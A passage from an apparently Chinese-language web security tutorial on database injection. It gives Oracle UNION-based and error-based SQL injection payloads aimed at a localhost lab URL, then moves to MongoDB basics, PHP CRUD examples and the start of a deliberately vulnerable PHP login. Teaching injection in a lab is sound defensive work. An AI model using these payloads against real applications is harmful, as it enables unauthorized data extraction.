<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">FROM</span> dual;</code></pre>
<p>获取所有数据库用户</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> username <span class="hljs-keyword">FROM</span> all_users;
<span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> sys.user$; <span class="hljs-comment">-- 需要高权限</span></code></pre>
<p>获取当前用户权限</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> session_privs</code></pre>
<p>获取当前用户有权限的所有数据库</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> owner, table_name <span class="hljs-keyword">FROM</span> all_tables</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015105341194.png" alt="image-20231015105341194"></p>
<p>获取表，all_tables类似于MySQL中的information_schema.tables，里面的结构可以自己构造sql语句。</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> all_tables;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015105406979.png" alt="image-20231015105406979"></p>
<p>获取字段名</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> all_tab_columns</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015105421077.png" alt="image-20231015105421077"></p>
<p>在Oracle启动时，在 userenv 中存储了一些系统上下文信息，通过 SYS_CONTEXT 函数，我们可以取回相应的参数值。包括当前用户名等等。</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> SYS_CONTEXT（<span class="hljs-string">'USERENV'</span>，<span class="hljs-string">'SESSION_USER'</span>） <span class="hljs-keyword">from</span> dual;</code></pre>
<p>更多可用参数说明可以查阅 Oracle 提供的文档：<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions165.htm">SYS_CONTEXT</a></p>
<h2 id="44-注入类型">4.4 注入类型</h2>
<h3 id="441-联合查询">4.4.1 联合查询</h3>
<p>order by 猜字段数量，union select进行查询，<strong>需要注意的是每一个字段都需要对应前面select的数据类型(字符串/数字)</strong>。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，比如：</p>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select null,null,null from dual -- 正常</span>
<span class="hljs-string">http://localhost:8080/oracleInject/index?username=admin'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual <span class="hljs-comment">-- 正常说明第一个字段是数字型</span>
http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select 1,2,null from dual -- 第二个字段为数字时错误</span>
<span class="hljs-string">http://localhost:8080/oracleInject/index?username=admin'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">'asd'</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual <span class="hljs-comment">-- 正常 为字符串 依此类推</span></code></pre>
<p>查数据库版本和用户名</p>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select 1,(select user from dual),(SELECT banner FROM v$version where banner like '</span>Oracle<span class="hljs-operator">%</span><span class="hljs-number">25</span><span class="hljs-string">') from dual -- </span></code></pre>
<p>查当前数据库</p>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select 1,(SELECT global_name FROM global_name),null from dual -- </span></code></pre>
<p>查表，wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代</p>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select 1,(select LISTAGG(table_name,'</span>,<span class="hljs-string">')within group(order by owner)name from all_tables where owner='</span><span class="hljs-keyword">SYSTEM</span><span class="hljs-string">'),null from dual -- </span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015111109733.png" alt="image-20231015111109733"></p>
<p>但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行。</p>
<p>查字段</p>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select 1,(select column_name from all_tab_columns where table_name='</span>TEST<span class="hljs-string">' and rownum=2),null from dual -- </span></code></pre>
<p>有表名字段名出数据就不说了。</p>
<h2 id="45-报错注入">4.5 报错注入</h2>
<h3 id="451-utl_inaddrget_host_name">4.5.1 utl_inaddr.get_host_name</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;</code></pre>
<p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p>
<h3 id="452-ctxsysdrithsxsn">4.5.2 <a target="_blank" rel="noopener" href="http://ctxsys.drithsx.sn">ctxsys.drithsx.sn</a></h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> ctxsys.drithsx.sn(<span class="hljs-number">1</span>, (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;</code></pre>
<p>处理文本的函数，参数错误时会报错。</p>
<h3 id="453-ctxsysctx_reporttoken_type">4.5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> CTXSYS.CTX_REPORT.TOKEN_TYPE((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual), <span class="hljs-string">'123'</span>) <span class="hljs-keyword">from</span> dual;</code></pre>
<h3 id="454-xmltype">4.5.4 XMLType</h3>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span></code></pre>
<p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</p>
<h3 id="456-dbms_xdb_versioncheckin">4.5.6 dbms_xdb_version.checkin</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> dbms_xdb_version.checkin((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;</code></pre>
<h3 id="457-dbms_xdb_versionmakeversioned">4.5.7 dbms_xdb_version.makeversioned</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> dbms_xdb_version.makeversioned((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;</code></pre>
<h3 id="458-dbms_xdb_versionuncheckout">4.5.8 dbms_xdb_version.uncheckout</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> dbms_xdb_version.uncheckout((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;</code></pre>
<h3 id="459-dbms_utilitysqlid_to_sqlhash">4.5.9 dbms_utility.sqlid_to_sqlhash</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;</code></pre>
<h3 id="4510-ordsysord_dicomgetmappingxpath">4.5.10 ordsys.ord_dicom.getmappingxpath</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> ordsys.ord_dicom.getmappingxpath((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> dual;</code></pre>
<h3 id="4511-utl_inaddrget_host_name">4.5.11 UTL_INADDR.get_host_name</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> UTL_INADDR.get_host_name((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;</code></pre>
<h3 id="4512-utl_inaddrget_host_address">4.5.12 UTL_INADDR.get_host_address</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> UTL_INADDR.get_host_name(<span class="hljs-string">'~'</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">||</span><span class="hljs-string">'~'</span>) <span class="hljs-keyword">from</span> dual;</code></pre>
<p>剩下的参考下面的链接吧，这里只是做个记录</p>
<h1 id="0x05-mongodb">0x05 MongoDB</h1>
<h2 id="51-nosql与mongodb基本概念">5.1 NoSQL与MongoDB基本概念</h2>
<p><strong>NoSQL</strong></p>
<p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p>
<p>NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>
<p><strong>NoSQL 数据库分类</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">类型</th>
<th style="text-align:left">部分代表</th>
<th style="text-align:left">特点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">列存储</td>
<td style="text-align:left">HbaseCassandraHypertable</td>
<td style="text-align:left">顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。</td>
</tr>
<tr>
<td style="text-align:left">文档存储</td>
<td style="text-align:left">MongoDBCouchDB</td>
<td style="text-align:left">文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。</td>
</tr>
<tr>
<td style="text-align:left">key-value存储</td>
<td style="text-align:left">Tokyo Cabinet / TyrantBerkeley DBMemcacheDBRedis</td>
<td style="text-align:left">可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能）</td>
</tr>
<tr>
<td style="text-align:left">图存储</td>
<td style="text-align:left">Neo4JFlockDB</td>
<td style="text-align:left">图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。</td>
</tr>
<tr>
<td style="text-align:left">对象存储</td>
<td style="text-align:left">db4oVersant</td>
<td style="text-align:left">通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。</td>
</tr>
<tr>
<td style="text-align:left">xml数据库</td>
<td style="text-align:left">Berkeley DB XMLBaseX</td>
<td style="text-align:left">高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。</td>
</tr>
</tbody>
</table>
<p><strong>MongoDB</strong></p>
<p>MongoDB属于NoSQL数据库的一种，是由C++语言编写的一个基于分布式文件存储的开源数据库系统，旨在为Web应用提供可扩展的高性能数据存储解决方案。在高负载的情况下，添加更多的节点，可以保证服务器性能。</p>
<p>MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。<strong>MongoDB 文档类似于 JSON 对象</strong>。字段值可以包含其他文档，数组及文档数组。</p>
<p><strong>MongoDB概念解析</strong></p>
<p>和关系型数据库的相关概念不一样，在MongoDB中基本的概念是文档、集合、数据库，如下表：</p>
<table>
<thead>
<tr>
<th style="text-align:left">SQL术语/概念</th>
<th style="text-align:left">MongoDB术语/概念</th>
<th style="text-align:left">解释/说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">database</td>
<td style="text-align:left">database</td>
<td style="text-align:left">数据库</td>
</tr>
<tr>
<td style="text-align:left">table</td>
<td style="text-align:left">collection</td>
<td style="text-align:left">数据库表/集合</td>
</tr>
<tr>
<td style="text-align:left">row</td>
<td style="text-align:left">document</td>
<td style="text-align:left">数据记录行/文档</td>
</tr>
<tr>
<td style="text-align:left">column</td>
<td style="text-align:left">field</td>
<td style="text-align:left">数据字段/域</td>
</tr>
<tr>
<td style="text-align:left">index</td>
<td style="text-align:left">index</td>
<td style="text-align:left">索引</td>
</tr>
<tr>
<td style="text-align:left">table joins</td>
<td style="text-align:left"></td>
<td style="text-align:left">表连接,MongoDB不支持</td>
</tr>
<tr>
<td style="text-align:left">primary key</td>
<td style="text-align:left">primary key</td>
<td style="text-align:left">主键,MongoDB自动将_id字段设置为主键</td>
</tr>
</tbody>
</table>
<h2 id="52-php操作mongodb">5.2 PHP操作MongoDB</h2>
<p>PHP下操作MongoDB大致分为两种方式，对应有不同的注入攻击方式。</p>
<h3 id="521-使用mongodb类中相应的方法">5.2.1 使用MongoDB类中相应的方法</h3>
<p>使用的Demo大致如下，此时传递进入的参数是一个数组：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;myinfo; <span class="hljs-comment">//选择数据库</span>
<span class="hljs-variable">$coll</span> = <span class="hljs-variable">$db</span>-&gt;test; <span class="hljs-comment">//选择集合</span>
<span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();    <span class="hljs-comment">//增</span>
<span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">find</span>();    <span class="hljs-comment">//查</span>
<span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>();    <span class="hljs-comment">//减</span>
<span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">update</span>();    <span class="hljs-comment">//改</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p><strong>确保连接及选择一个数据库</strong></p>
<p>为了确保正确连接，你需要指定数据库名，如果数据库在MongoDB中不存在，MongoDB会自动创建。</p>
<p>示例代码如下，访问页面会直接返回数据库名test：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>(); <span class="hljs-comment">// 连接默认主机和端口为：mongodb://localhost:27017</span>
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test; <span class="hljs-comment">// 获取名称为 "test" 的数据库</span>
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$db</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<h4 id="1-创建集合">1. 创建集合</h4>
<p>创建集合的代码片段如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>(); <span class="hljs-comment">// 连接</span>
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test; <span class="hljs-comment">// 获取名称为 "test" 的数据库</span>
<span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">createCollection</span>(<span class="hljs-string">"Mi1k"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"集合创建成功："</span>.<span class="hljs-variable">$collection</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>在数据库中确认确实创建成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015113802968.png" alt="image-20231015113802968"></p>
<h4 id="2-插入文档">2. 插入文档</h4>
<p>在MongoDB中使用insert()方法插入文档，代码片段如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span>
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span>
<span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;Mi1k; <span class="hljs-comment">// 选择集合</span>
<span class="hljs-variable">$document</span> = <span class="hljs-keyword">array</span>( 
    <span class="hljs-string">"title"</span> =&gt; <span class="hljs-string">"Hello"</span>, 
    <span class="hljs-string">"description"</span> =&gt; <span class="hljs-string">"Just a test."</span>, 
    <span class="hljs-string">"likes"</span> =&gt; <span class="hljs-number">100</span>,
    <span class="hljs-string">"url"</span> =&gt; <span class="hljs-string">"https://www.mi1k7ea.com/"</span>,
    <span class="hljs-string">"by"</span>, <span class="hljs-string">"mi1k7ea"</span>
);
<span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$document</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"数据插入成功"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>插入成功后，到数据库中确认，这里pretty()方法以格式化的方式来显示所有文档。：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015113824293.png" alt="image-20231015113824293"></p>
<h4 id="3-查找文档">3. 查找文档</h4>
<p>使用find()方法来读取集合中的文档，代码片段如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span>
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span>
<span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;Mi1k; <span class="hljs-comment">// 选择集合</span>

<span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">find</span>();
<span class="hljs-comment">// 迭代显示文档标题</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$document</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$document</span>[<span class="hljs-string">"title"</span>] . <span class="hljs-string">"\n"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>访问即可看到查询的标题：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015113904280.png" alt="image-20231015113904280"></p>
<h4 id="4-更新文档">4. 更新文档</h4>
<p>使用update()方法来更新文档，代码片段如下，将标题内容从Hello改为World：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span>
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span>
<span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;Mi1k; <span class="hljs-comment">// 选择集合</span>
<span class="hljs-comment">// 更新文档</span>
<span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"title"</span>=&gt;<span class="hljs-string">"Hello"</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">'$set'</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">"title"</span>=&gt;<span class="hljs-string">"World"</span>)));
<span class="hljs-comment">// 显示更新后的文档</span>
<span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">find</span>();
<span class="hljs-comment">// 循环显示文档标题</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$document</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$document</span>[<span class="hljs-string">"title"</span>] . <span class="hljs-string">"\n"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>修改后显示改后的标题内容，客户端确认是修改了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015113934648.png" alt="image-20231015113934648"></p>
<h4 id="5-删除文档">5. 删除文档</h4>
<p>使用remove()方法来删除文档。</p>
<p>代码片段如下，将移除’title’为’World’的一条数据记录：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span>
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span>
<span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;Mi1k; <span class="hljs-comment">// 选择集合</span>
   
<span class="hljs-comment">// 移除文档</span>
<span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"title"</span>=&gt;<span class="hljs-string">"World"</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">"justOne"</span> =&gt; <span class="hljs-literal">true</span>));

<span class="hljs-comment">// 显示可用文档数据</span>
<span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">find</span>();
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$document</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$document</span>[<span class="hljs-string">"title"</span>] . <span class="hljs-string">"\n"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>访问之后，即删除了title为World的文档，在数据库中查不到Mi1k集合的文档内容了。</p>
<h3 id="522-使用execute函数执行字符串">5.2.2 使用execute()函数执行字符串</h3>
<p>使用的Demo大致如下，此时传进方法execute()的参数就是字符串变量$query（特别的，此时的字符串书写语法为JS的书写语法）：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mongoclient</span>();
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;myinfo; <span class="hljs-comment">//选择数据库</span>
<span class="hljs-variable">$query</span> = <span class="hljs-string">"db.table.save({'newsid':1})"</span>;    <span class="hljs-comment">//增</span>
<span class="hljs-variable">$query</span> = <span class="hljs-string">"db.table.find({'newsid':1})"</span>;    <span class="hljs-comment">//查</span>
<span class="hljs-variable">$query</span> = <span class="hljs-string">"db.table.remove({'newsid':1})"</span>;    <span class="hljs-comment">//减</span>
<span class="hljs-variable">$query</span> = <span class="hljs-string">"db.table.update({'newsid':1},{'newsid',2})"</span>;    改
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$query</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<h2 id="53-php-mongodb注入攻击">5.3 PHP MongoDB注入攻击</h2>
<p>不同编程语言环境下的MongoDB注入情景没啥差别，这里主要对PHP中实现的MongoDB进行详细分析，理解原理和场景就OK，其他语言就大致给Demo就好。</p>
<p>在此之前，我们需要先初始化数据库、赋给一些用户数据用于后面的Demo使用，这里随机添加10个用户，最后一个test用户为公共用户、大家都知道的：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span>
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span>
<span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;test; <span class="hljs-comment">// 选择集合</span>
<span class="hljs-variable">$ori</span> = <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwsyz'</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) { 
    <span class="hljs-variable">$str</span> = <span class="hljs-string">''</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$j</span>++) { 
        <span class="hljs-variable">$str</span> .= <span class="hljs-variable">$ori</span>[<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ori</span>)-<span class="hljs-number">1</span>)];
    }
    <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(
        <span class="hljs-string">'userid'</span>=&gt;<span class="hljs-variable">$i</span>,
        <span class="hljs-string">'username'</span>=&gt;<span class="hljs-string">'user'</span>.<span class="hljs-variable">$i</span>,
        <span class="hljs-string">'password'</span>=&gt;<span class="hljs-variable">$str</span>
        );
    <span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$data</span>);
}
<span class="hljs-keyword">echo</span> <span class="hljs-string">'添加成功&lt;br&gt;'</span>;
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(
    <span class="hljs-string">'userid'</span>=&gt;<span class="hljs-number">10</span>,
    <span class="hljs-string">'username'</span>=&gt;<span class="hljs-string">'test'</span>,
    <span class="hljs-string">'password'</span>=&gt;<span class="hljs-string">'test'</span>
    );
<span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$data</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">'用户test添加成功'</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>访问触发一遍即可创建成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015114445664.png" alt="image-20231015114445664"></p>
<h3 id="531-php数组注入重言式注入">5.3.1 PHP数组注入/重言式注入</h3>
<p>一个数组绑定的查询代码如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span>
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;test; <span class="hljs-comment">//选择数据库</span>
<span class="hljs-variable">$coll</span> = <span class="hljs-variable">$db</span>-&gt;test; <span class="hljs-comment">//选择集合</span>
<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>];
<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'password'</span>];
